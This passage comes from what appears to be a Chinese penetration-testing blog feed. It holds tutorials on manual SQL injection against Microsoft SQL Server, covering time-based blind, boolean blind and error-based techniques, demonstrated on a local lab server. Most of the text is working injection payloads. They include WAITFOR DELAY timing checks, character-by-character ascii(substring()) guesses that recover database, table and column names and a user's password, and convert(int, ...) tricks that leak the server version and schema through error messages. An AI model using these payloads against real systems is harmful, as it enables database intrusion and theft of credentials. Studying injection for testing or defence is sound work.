&#x27;0:0:3&#x27;--</span><br><span class="line">判断 password 列第六个字符：2</span><br><span class="line">if (ascii(substring((select top 1 password from users),6,1)) =50) WAITFOR DELAY &#x27;0:0:3&#x27;--</span><br><span class="line">判断 password 列第七个字符：0</span><br><span class="line">if (ascii(substring((select top 1 password from users),7,1)) =48) WAITFOR DELAY &#x27;0:0:3&#x27;--</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1468.png" alt="图片"></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1469.png" alt="图片"></p><p>自此天书<code>Mssql</code>手工注入之布尔时间盲注就到这里~</p><h2 id="公众号"><a href="#公众号" class="headerlink" title="公众号"></a>公众号</h2><p><strong>若有好的建议和合作可以通过公众号与我联系！</strong><br>微信公众号：<code>渗透攻击红队</code><br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/logo/vxgzh.jpeg"></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞原理 </tag>
            
            <tag> SQL注入 </tag>
            
            <tag> MsSQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Microsoft SQL Server手注之布尔型盲注</title>
      <link href="/2020/03/12/SQL-MsSQL-3/"/>
      <url>/2020/03/12/SQL-MsSQL-3/</url>
      
        <content type="html"><![CDATA[<h2 id="判断是否存在注⼊"><a href="#判断是否存在注⼊" class="headerlink" title="判断是否存在注⼊"></a>判断是否存在注⼊</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x27;</span><br><span class="line">and 1=1 </span><br><span class="line">and 1=2</span><br></pre></td></tr></table></figure><h2 id="猜测数据库名"><a href="#猜测数据库名" class="headerlink" title="猜测数据库名"></a>猜测数据库名</h2><h3 id="先猜dbid是否存在："><a href="#先猜dbid是否存在：" class="headerlink" title="先猜dbid是否存在："></a>先猜dbid是否存在：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.159.135:8080/get.aspx?id=1 and (select count(*) from master.dbo.sysdatabases where dbid=5)=1</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1422.png" alt="图片"></p><p>上面的这条语句的意思是查询 <code>dbid=5</code> 是否存在，最后那个<code>=1</code>就是是否存在的意思！存在说明返回正常！</p><p>因为我数据库新建了两个：<code>test</code>（dbid5）、<code>saulgoodman</code>（dbid6）</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1423.png" alt="图片"></p><p>所以我们就能查询出他存在<code>dbid6</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.159.135:8080/get.aspx?id=1 and (select count(*) from master.dbo.sysdatabases where dbid=6)=1</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1424.png" alt="图片"></p><p>查询<code>dbid7</code>的话就会返回错误：因为它不存在</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1425.png" alt="图片"></p><h3 id="根据dbid猜库名，先猜出长度"><a href="#根据dbid猜库名，先猜出长度" class="headerlink" title="根据dbid猜库名，先猜出长度"></a>根据dbid猜库名，先猜出长度</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.159.135:8080/get.aspx?id=1 and (select count(*) from master.dbo.sysdatabases where dbid=5 and len(name)=4)=1</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1426.png" alt="图片"></p><p>因为我们<code>dbid5</code>的数据库名是<code>test</code>，他的长度是<code>4</code>！<code>dbid=5 and len(name)=4</code> 这条语句的意思是查询 <code>dbid=5</code> 的这个数据库名的长度是否<code>=4</code>，返回正常说明它的长度<code>=4</code>！</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.159.135:8080/get.aspx?id=1 and (select count(*) from master.dbo.sysdatabases where dbid=6 and len(name)=11)=1</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1427.png" alt="图片"></p><p>我们查询<code>dbid6</code>的数据库名是<code>saulgoodman</code>，他的长度是<code>11</code>！<code>dbid=6 and len(name)=11</code> 这条语句的意思是查询 <code>dbid=6</code> 的这个数据库名的长度是否<code>=11</code>，返回正常说明它的长度<code>=11</code>！以此类推查询多个数据库名的长度！</p><h3 id="根据dbid查询挨个查询数据库名"><a href="#根据dbid查询挨个查询数据库名" class="headerlink" title="根据dbid查询挨个查询数据库名"></a>根据dbid查询挨个查询数据库名</h3><p>PS：<code>substring(str,start,len)</code> 截取字符串的作用，第一个参数为要截取的字符串，第二个参数为从哪里开始截取，第三个参数为截取的长度</p><p><code>ascii(char)</code> 把<code>字符</code>转换为<code>ascii</code>值</p><p>因为我们<code>dbid5</code>的数据库名是<code>test</code>，他的第一个字符<code>t</code>是<code>ASCII</code>码为<code>116</code>，我们就可以使用下面的语句来判断：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and ascii(substring((select top 1 name from master.dbo.sysdatabases where dbid=5),1,1)) = 116</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1428.png" alt="图片"></p><p>依次查询：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">第二个字符：e</span><br><span class="line">and ascii(substring((select top 1 name from master.dbo.sysdatabases where dbid=5),2,1)) = 101</span><br><span class="line">第三个字符：s</span><br><span class="line">and ascii(substring((select top 1 name from master.dbo.sysdatabases where dbid=5),3,1)) = 115</span><br><span class="line">第四个字符：t</span><br><span class="line">and ascii(substring((select top 1 name from master.dbo.sysdatabases where dbid=5),4,1)) = 116</span><br></pre></td></tr></table></figure><p>这样我们就猜解出来了数据库名为：<code>test</code>！</p><p>如果想要猜解第二个数据库名的话那么就吧<code>dbid</code>更改为<code>6</code>，然后按照上面的操作重复就好了！</p><h2 id="猜解表名"><a href="#猜解表名" class="headerlink" title="猜解表名"></a>猜解表名</h2><p>因为我们知道了数据库名是<code>test</code>，然后我们就可以使用下面的语句来查询第一个表名的长度是否等于<code>5</code>(表名是<code>users</code>)：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select count(*) from test.dbo.sysobjects where name in (select top 1 name from test.dbo.sysobjects where xtype=&#x27;u&#x27;) and len(name)=5)=1</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1429.png" alt="图片"></p><p>由上图可见，页面返回正常说明它的长度是<code>5</code>，那么我们就可以挨个猜解他的字符：<code>users</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">猜解第一个字符：u</span><br><span class="line">and (select count(*) from test.dbo.sysobjects where name in (select top 1 name from test.dbo.sysobjects where xtype=&#x27;u&#x27;) and ascii(substring(name,1,1))=117)=1</span><br><span class="line">猜解第二个字符：s</span><br><span class="line">and (select count(*) from test.dbo.sysobjects where name in (select top 1 name from test.dbo.sysobjects where xtype=&#x27;u&#x27;) and ascii(substring(name,2,1))=115)=1</span><br><span class="line">猜解第三个字符：e</span><br><span class="line">and (select count(*) from test.dbo.sysobjects where name in (select top 1 name from test.dbo.sysobjects where xtype=&#x27;u&#x27;) and ascii(substring(name,3,1))=101)=1</span><br><span class="line">猜解第四个字符：r</span><br><span class="line">and (select count(*) from test.dbo.sysobjects where name in (select top 1 name from test.dbo.sysobjects where xtype=&#x27;u&#x27;) and ascii(substring(name,4,1))=114)=1</span><br><span class="line">猜解第五个字符：s</span><br><span class="line">and (select count(*) from test.dbo.sysobjects where name in (select top 1 name from test.dbo.sysobjects where xtype=&#x27;u&#x27;) and ascii(substring(name,5,1))=115)=1</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1430.png" alt="图片"></p><p>因为我们知道了数据库名是<code>test</code>，第<code>一</code>个<code>表名</code>是 <code>users</code>，然后我们就可以使用下面的语句来查询第<code>二</code>个<code>表名</code>的字符(表名是<code>info</code>)：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">猜解第一个字符：i</span><br><span class="line">and (select count(*) from test.dbo.sysobjects where name in (select top 1 name from test.dbo.sysobjects where xtype=&#x27;u&#x27; and name not in (&#x27;users&#x27;)) and ascii(substring(name,1,1))=105)=1</span><br><span class="line">猜解第二个字符：n</span><br><span class="line">and (select count(*) from test.dbo.sysobjects where name in (select top 1 name from test.dbo.sysobjects where xtype=&#x27;u&#x27; and name not in (&#x27;users&#x27;)) and ascii(substring(name,2,1))=110)=1</span><br><span class="line">猜解第三个字符：f</span><br><span class="line">and (select count(*) from test.dbo.sysobjects where name in (select top 1 name from test.dbo.sysobjects where xtype=&#x27;u&#x27; and name not in (&#x27;users&#x27;)) and ascii(substring(name,3,1))=102)=1</span><br><span class="line">猜解第二个字符：o</span><br><span class="line">and (select count(*) from test.dbo.sysobjects where name in (select top 1 name from test.dbo.sysobjects where xtype=&#x27;u&#x27; and name not in (&#x27;users&#x27;)) and ascii(substring(name,4,1))=111)=1</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1431.png" alt="图片"></p><h2 id="猜解列名"><a href="#猜解列名" class="headerlink" title="猜解列名"></a>猜解列名</h2><p>因为我们知道了表名是 <code>users</code>，那么我们可以猜解 <code>users</code> 表名下的列名：（列名是 <code>username</code>）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">猜解列名第一个字符：u</span><br><span class="line">and exists(select top 1 name from syscolumns where id =(select id from sysobjects where name = &#x27;users&#x27;) and unicode(substring(name,1,1))=117)</span><br><span class="line">猜解列名第二个字符：s</span><br><span class="line">and exists(select top 1 name from syscolumns where id =(select id from sysobjects where name = &#x27;users&#x27;) and unicode(substring(name,2,1))=115)</span><br><span class="line">猜解列名第三个字符：e</span><br><span class="line">and exists(select top 1 name from syscolumns where id =(select id from sysobjects where name = &#x27;users&#x27;) and unicode(substring(name,3,1))=101)</span><br><span class="line">猜解列名第四个字符：r</span><br><span class="line">and exists(select top 1 name from syscolumns where id =(select id from sysobjects where name = &#x27;users&#x27;) and unicode(substring(name,4,1))=114)</span><br><span class="line">猜解列名第五个字符：n</span><br><span class="line">and exists(select top 1 name from syscolumns where id =(select id from sysobjects where name = &#x27;users&#x27;) and unicode(substring(name,5,1))=110)</span><br><span class="line">猜解列名第六个字符：a</span><br><span class="line">and exists(select top 1 name from syscolumns where id =(select id from sysobjects where name = &#x27;users&#x27;) and unicode(substring(name,6,1))=97)</span><br><span class="line">猜解列名第七个字符：m</span><br><span class="line">and exists(select top 1 name from syscolumns where id =(select id from sysobjects where name = &#x27;users&#x27;) and unicode(substring(name,7,1))=109)</span><br><span class="line">猜解列名第八个字符：e</span><br><span class="line">and exists(select top 1 name from syscolumns where id =(select id from sysobjects where name = &#x27;users&#x27;) and unicode(substring(name,8,1))=101)</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1432.png" alt="图片"></p><p>这样就猜解出来了第<code>一</code>个列名，<code>username</code>！</p><p>第二种方式：我们有 <code>id</code>、<code>username</code>、<code>password</code>、<code>age</code> 四个列</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1433.png" alt="图片"></p><p>获取第一列：（列名是<code>id</code>）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">获取第一个字符：i</span><br><span class="line">and ascii(substring((select top 1 name from syscolumns where id=(select id from sysobjects where xtype=0x75 and name=&#x27;users&#x27;)),1,1)) =105</span><br><span class="line">获取第二个字符：d</span><br><span class="line">and ascii(substring((select top 1 name from syscolumns where id=(select id from sysobjects where xtype=0x75 and name=&#x27;users&#x27;)),2,1)) =100</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1434.png" alt="图片"></p><p>获取第二列：（列名是<code>username</code>）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">获取第一个字符：u</span><br><span class="line">and ascii(substring((select top 1 name from syscolumns where id=(select id from sysobjects where xtype=0x75 and name=&#x27;users&#x27;) and name not in (&#x27;id&#x27;)),1,1)) = 117</span><br><span class="line">获取第二个字符：s</span><br><span class="line">and ascii(substring((select top 1 name from syscolumns where id=(select id from sysobjects where xtype=0x75 and name=&#x27;users&#x27;) and name not in (&#x27;id&#x27;)),2,1)) = 115</span><br><span class="line">获取第三个字符：e</span><br><span class="line">and ascii(substring((select top 1 name from syscolumns where id=(select id from sysobjects where xtype=0x75 and name=&#x27;users&#x27;) and name not in (&#x27;id&#x27;)),3,1)) = 101</span><br><span class="line">获取第四个字符：r</span><br><span class="line">and ascii(substring((select top 1 name from syscolumns where id=(select id from sysobjects where xtype=0x75 and name=&#x27;users&#x27;) and name not in (&#x27;id&#x27;)),4,1)) = 114</span><br><span class="line">获取第五个字符：n</span><br><span class="line">and ascii(substring((select top 1 name from syscolumns where id=(select id from sysobjects where xtype=0x75 and name=&#x27;users&#x27;) and name not in (&#x27;id&#x27;)),5,1)) = 110</span><br><span class="line">获取第六个字符：a</span><br><span class="line">and ascii(substring((select top 1 name from syscolumns where id=(select id from sysobjects where xtype=0x75 and name=&#x27;users&#x27;) and name not in (&#x27;id&#x27;)),6,1)) = 97</span><br><span class="line">获取第七个字符：m</span><br><span class="line">and ascii(substring((select top 1 name from syscolumns where id=(select id from sysobjects where xtype=0x75 and name=&#x27;users&#x27;) and name not in (&#x27;id&#x27;)),7,1)) = 109</span><br><span class="line">获取第八个字符：e</span><br><span class="line">and ascii(substring((select top 1 name from syscolumns where id=(select id from sysobjects where xtype=0x75 and name=&#x27;users&#x27;) and name not in (&#x27;id&#x27;)),8,1)) = 101</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1435.png" alt="图片"></p><p>获取第三列：（列名是<code>password</code>）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">获取第一个字符：p</span><br><span class="line">and ascii(substring((select top 1 name from syscolumns where id=(select id from sysobjects where xtype=0x75 and name=&#x27;users&#x27;) and name not in (&#x27;id&#x27;) and name not in (&#x27;username&#x27;)),1,1)) =112</span><br><span class="line">获取第二个字符：a</span><br><span class="line">and ascii(substring((select top 1 name from syscolumns where id=(select id from sysobjects where xtype=0x75 and name=&#x27;users&#x27;) and name not in (&#x27;id&#x27;) and name not in (&#x27;username&#x27;)),2,1)) =97</span><br><span class="line">获取第三个字符：s</span><br><span class="line">and ascii(substring((select top 1 name from syscolumns where id=(select id from sysobjects where xtype=0x75 and name=&#x27;users&#x27;) and name not in (&#x27;id&#x27;) and name not in (&#x27;username&#x27;)),3,1)) =115</span><br><span class="line">获取第四个字符：s</span><br><span class="line">and ascii(substring((select top 1 name from syscolumns where id=(select id from sysobjects where xtype=0x75 and name=&#x27;users&#x27;) and name not in (&#x27;id&#x27;) and name not in (&#x27;username&#x27;)),4,1)) =115</span><br><span class="line">获取第五个字符：w</span><br><span class="line">and ascii(substring((select top 1 name from syscolumns where id=(select id from sysobjects where xtype=0x75 and name=&#x27;users&#x27;) and name not in (&#x27;id&#x27;) and name not in (&#x27;username&#x27;)),5,1)) =119</span><br><span class="line">获取第六个字符：o</span><br><span class="line">and ascii(substring((select top 1 name from syscolumns where id=(select id from sysobjects where xtype=0x75 and name=&#x27;users&#x27;) and name not in (&#x27;id&#x27;) and name not in (&#x27;username&#x27;)),6,1)) =111</span><br><span class="line">获取第七个字符：r</span><br><span class="line">and ascii(substring((select top 1 name from syscolumns where id=(select id from sysobjects where xtype=0x75 and name=&#x27;users&#x27;) and name not in (&#x27;id&#x27;) and name not in (&#x27;username&#x27;)),7,1)) =114</span><br><span class="line">获取第八个字符：d</span><br><span class="line">and ascii(substring((select top 1 name from syscolumns where id=(select id from sysobjects where xtype=0x75 and name=&#x27;users&#x27;) and name not in (&#x27;id&#x27;) and name not in (&#x27;username&#x27;)),8,1)) =100</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1436.png" alt="图片"></p><p>如果想获取第<code>四</code>列的话继续在后面加一个判断语句：<code>and name not in (&#39;列名&#39;)</code> 就可以了！ </p><h2 id="获取数据"><a href="#获取数据" class="headerlink" title="获取数据"></a>获取数据</h2><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1437.png" alt="图片"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and ascii(substring((select top 1 列名 from 表名),N,1)) &gt;= 65</span><br></pre></td></tr></table></figure><p>我们知道了表名是：<code>users</code>，列名是：<code>username</code>、<code>passwrd</code>，那么我们就开始爆数据了：（<code>saul</code>）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">判断username列第一个字符：s</span><br><span class="line">and ascii(substring((select top 1 username from users),1,1)) = 115</span><br><span class="line">判断username列第二个字符：a</span><br><span class="line">and ascii(substring((select top 1 username from users),2,1)) = 97</span><br><span class="line">判断username列第三个字符：u</span><br><span class="line">and ascii(substring((select top 1 username from users),3,1)) = 117</span><br><span class="line">判断username列第四个字符：l</span><br><span class="line">and ascii(substring((select top 1 username from users),4,1)) =108</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1438.png" alt="图片"></p><p>这样就获取到了第一个用户名为：<code>saul</code></p><p>获取 <code>saul</code> 的密码：（密码是<code>saul520</code>）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">判断 password 列第一个字符：s</span><br><span class="line">and ascii(substring((select top 1 password from users),1,1)) =115</span><br><span class="line">判断 password 列第二个字符：a</span><br><span class="line">and ascii(substring((select top 1 password from users),2,1)) =97</span><br><span class="line">判断 password 列第三个字符：u</span><br><span class="line">and ascii(substring((select top 1 password from users),3,1)) =117</span><br><span class="line">判断 password 列第四个字符：l</span><br><span class="line">and ascii(substring((select top 1 password from users),4,1)) =108</span><br><span class="line">判断 password 列第五个字符：5</span><br><span class="line">and ascii(substring((select top 1 password from users),5,1)) =53</span><br><span class="line">判断 password 列第六个字符：2</span><br><span class="line">and ascii(substring((select top 1 password from users),6,1)) =50</span><br><span class="line">判断 password 列第七个字符：0</span><br><span class="line">and ascii(substring((select top 1 password from users),7,1)) =48</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1439.png" alt="图片"></p><p>自此天书<code>Mssql</code>手工注入之<code>布尔盲注</code>就到这里~</p><h2 id="公众号"><a href="#公众号" class="headerlink" title="公众号"></a>公众号</h2><p><strong>若有好的建议和合作可以通过公众号与我联系！</strong><br>微信公众号：<code>渗透攻击红队</code><br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/logo/vxgzh.jpeg"></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞原理 </tag>
            
            <tag> SQL注入 </tag>
            
            <tag> MsSQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Microsoft SQL Server手注之报错注入</title>
      <link href="/2020/03/12/SQL-MsSQL-2/"/>
      <url>/2020/03/12/SQL-MsSQL-2/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>今天主要分享下<code>sql</code>注入中的<code>报错型</code>，在大多网上的文章会列出类似于公式的句子，却没解释为什么要使用这样的函数，为什么使用这个函数会出现报错而导致sql注入。</p><p><code>convert()</code>函数,<code>CONVERT() </code>函数是把⽇期转换为新数据类型的通⽤函数。</p><p>语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CONVERT(data_type(length),data_to_be_converted,style)</span><br><span class="line">注释 ：</span><br><span class="line">data_type(length) 转换为⽬标数据类型（带有可选的长度）。</span><br><span class="line">data_to_be_converted 含有需要转换的值。</span><br><span class="line">style 规定⽇期/时间的输出格式。</span><br></pre></td></tr></table></figure><p>⽰例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CONVERT(VARCHAR(19),GETDATE())</span><br><span class="line">CONVERT(VARCHAR(10),GETDATE(),110) </span><br><span class="line">CONVERT(VARCHAR(11),GETDATE(),106)</span><br><span class="line">CONVERT(VARCHAR(24),GETDATE(),113)</span><br></pre></td></tr></table></figure><p>结果类似：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Dec 29 2008 11:45 PM</span><br><span class="line">12-29-2008</span><br><span class="line">29 Dec 08</span><br><span class="line">29 Dec 2008 16:25:46.635</span><br></pre></td></tr></table></figure><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>对于 <code>convert(int,@@version)</code>，<code>convert</code> 函数⾸先会执⾏第⼆个参数指定的SQL查询，然后尝试将查询结果转换为<code>int</code>类型。但是，由于这个SQL查询的结果是<code>varchar</code>类型，⽆法进⾏指定的转换，所以，<code>convert</code>函数会抛出 ⼀个<code>SQL server</code>错误消息，指出“SQL查询结果”⽆法转换为<code>“int”</code>类型，这样的话，攻击者就能得到的这个SQL查询的结果了。 </p><p>满⾜条件的函数还有很多：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">convert() </span><br><span class="line">file_name() </span><br><span class="line">db_name() </span><br><span class="line">col_name() </span><br><span class="line">filegroup_name()</span><br><span class="line">object_name() </span><br><span class="line">schema_name() </span><br><span class="line">type_name() </span><br><span class="line">cast()</span><br></pre></td></tr></table></figure><h2 id="注⼊流程"><a href="#注⼊流程" class="headerlink" title="注⼊流程"></a>注⼊流程</h2><h3 id="查询基本信息"><a href="#查询基本信息" class="headerlink" title="查询基本信息"></a>查询基本信息</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">convert(int,@@version) 获取版本信息 </span><br><span class="line">convert(int,db_name()) 数据库名字 </span><br><span class="line">convert(int,user)当前⽤户名 </span><br><span class="line">convert(int,@@SERVERNAME)获取有关服务器主机的信息</span><br></pre></td></tr></table></figure><h3 id="获取版本信息"><a href="#获取版本信息" class="headerlink" title="获取版本信息"></a>获取版本信息</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.159.135:8080/get.aspx?id=convert(int,@@version) </span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1412.png" alt="图片"></p><p>注意在这里我们直接吧函数放到 <code>id=</code> 的后面，因为 <code>id=1</code> 查询的是整型（<code>int</code>），而我们的 <code>convert(int,@@version)</code> 获取到的版本信息是<code>字符型</code>，所以他就会报错，从而爆出版本信息！</p><p>或者也可以使用这条语句也能实现上面的查询结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.159.135:8080/get.aspx?id=1 and 1=(convert(int,@@version))</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1413.png" alt="图片"></p><h3 id="获取当前数据库的表名"><a href="#获取当前数据库的表名" class="headerlink" title="获取当前数据库的表名"></a>获取当前数据库的表名</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CONVERT(int,(select top 1 table_name from information_schema.columns))</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.159.135:8080/get.aspx?id=CONVERT(int,(select top 1 table_name from information_schema.columns))</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1414.png" alt="图片"></p><p>我们获取到了当前网站数据库的表名是：<code>users</code>！</p><h3 id="获取列名"><a href="#获取列名" class="headerlink" title="获取列名"></a>获取列名</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">convert(int,(select top 1 COLUMN_NAME from information_schema.columns where TABLE_NAME=cast(16进制的表名 as varchar)))</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.159.135:8080/get.aspx?id=convert(int,(select top 1 COLUMN_NAME from information_schema.columns where TABLE_NAME=cast(0x7573657273  as varchar)))</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1415.png" alt="图片"></p><p>这样我们就获取到了第一个列名 <code>id</code>！</p><p>那么想要获取第二个列名我们就可以再后面加一个条件语句：<code>and COLUMN_NAME != &#39;id&#39;</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.159.135:8080/get.aspx?id=convert(int,(select top 1 COLUMN_NAME from information_schema.columns where TABLE_NAME=cast(0x7573657273 as varchar) and COLUMN_NAME != &#x27;id&#x27;))</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1416.png" alt="图片"></p><p>这样我们就获取到了第二个列名：<code>username</code> ！</p><p>想要获取第三个也是以此类推加条件语句：<code>and COLUMN_NAME != &#39;username&#39;</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.159.135:8080/get.aspx?id=convert(int,(select top 1 COLUMN_NAME from information_schema.columns where TABLE_NAME=cast(0x7573657273 as varchar) and COLUMN_NAME != &#x27;id&#x27; and COLUMN_NAME != &#x27;username&#x27;))</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1417.png" 